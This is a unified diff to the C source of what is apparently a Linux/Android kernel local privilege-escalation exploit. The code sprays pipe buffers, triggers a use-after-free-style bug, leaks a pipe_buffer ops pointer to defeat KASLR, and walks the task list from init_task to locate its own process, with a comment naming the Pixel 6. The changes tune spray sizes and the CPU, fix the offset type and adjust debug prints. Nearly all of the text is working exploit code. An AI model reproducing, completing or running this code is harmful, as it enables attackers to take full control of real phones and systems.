@@ -42,9 +42,9 @@
 
 #define MAX_PIPE_NUM 0x400
 #define MAX_256_PIPE 0x400
-#define FIRST_PIPE_SPRAY 0x200
+#define FIRST_PIPE_SPRAY 0x180
 #define PIPE_PAGE_NUM 0x600
-#define CPU 0
+#define CPU 1
 
 #define CHECK(a, b)                                                            \
   do {                                                                         \
@@ -508,10 +508,6 @@ static void loop(void) {
       exit(1);
     if (pid == 0) {
 #ifdef PATCHED
-      // if (add_key("user", "123", "hehe", 4, KEY_SPEC_THREAD_KEYRING) < 0) {
-      //   perror("add key");
-      //   exit(0);
-      // }
       setuid(getuid());
 #endif
       printf("in trigger process\n");
@@ -552,10 +548,6 @@ int timerfd[0x80] = {};
 void execute_call(int call) {
   intptr_t res = 0;
   switch (call) {
-  case 0:
-    break;
-  case 1:
-    break;
   case 2:
     NONFAILING(*(uint32_t *)0x20000084 = 0);
     NONFAILING(*(uint32_t *)0x20000088 = 1);
@@ -862,7 +854,6 @@ void exploit(void) {
   while (count) {
     usleep(10);
     int res = read(sync_pipes[0], global_buffer, count);
-    printf("read res : %d\n", res);
     count -= res;
   }
   // printf("first part spray done\n");
@@ -904,11 +895,9 @@ void exploit(void) {
   read(signal_pipes[0], data, 1);
   assert(data[0] == 'S');
   // sleep for a while making sure the memory is freed
-  printf("child exited\n");
   usleep(100 * 1000);
 
-  // printf("[*] STAGE 3: free the cache\n");
-  printf("[*] STAGE 3: ...\n");
+  printf("[*] STAGE 3: free the cache\n");
   // now free the iov
   for (int i = MAX_256_PIPE - 1; i >= 0; i--) {
     usleep(10);
@@ -923,7 +912,6 @@ void exploit(void) {
     // printf("read res : %d\n", res);
     count -= res;
   }
-  printf("free done\n");
 
 #if 0
   printf("let's crash the kernel\n");
@@ -970,7 +958,6 @@ void exploit(void) {
         pipe_buffer = recv_buffer + j;
         DumpHex(pipe_buffer, 0x30);
         memcpy(global_data + 0x80, pipe_buffer, 40);
-        printf("index %d, address at %p\n", j, pipe_buffer);
         exp_pipe_idx = i;
         exp_pipes[2] = pipe_pages[i][0];
         exp_pipes[3] = pipe_pages[i][1];
@@ -987,7 +974,6 @@ void exploit(void) {
     getchar();
   }
 
-  // printf("done\n");
   write_file("/proc/self/comm", "expp");
   // pixel 6
   // ffffffdc0bfcbec0 init_task
@@ -998,14 +984,11 @@ void exploit(void) {
   write(exp_pipes[3], recv_buffer, 0x1000);
   printf("leaked pipe page at %lx\n", pipe_buffer[0]);
   printf("leaked ops at %lx\n", pipe_buffer[2]);
-  unsigned kaslr_offset = pipe_buffer[2] - anon_pipe_buf_ops;
+  unsigned long kaslr_offset = pipe_buffer[2] - anon_pipe_buf_ops;
 
   init_task += kaslr_offset;
+  printf("kaslr offset is %lx\n", kaslr_offset);
   printf("init task at %lx\n", init_task);
-  // memset(data, 0, 0x20);
-  // read_mem(pipe_buffer[2], data, 0x20);
-  // DumpHex(data, 0x20);
-
   printf("looking for my process...\n");
 
   unsigned long current_task = init_task;
@@ -1015,9 +998,8 @@ void exploit(void) {
 
     unsigned long name[2];
     name[0] = read64(current_task + 0x790);
-    printf("found process: %8s\n", (char *)name);
     if (!strcmp((char *)name, "expp")) {
-      printf("we found the process\n");
+      printf("we found the process at %lx\n", current_task);
       break;
     }
   }
@@ -1115,9 +1097,7 @@ int main(int argc, char **argv) {
     signal(SIGUSR1, signal_handler);
     read(signal_pipes[0], data, 1);
     assert(data[0] == 'S');
-    printf("triggering the bug\n");
     do_trigger();
-    printf("trigger done\n");
     kill(getppid(), SIGUSR2);
     exit(0);
   }
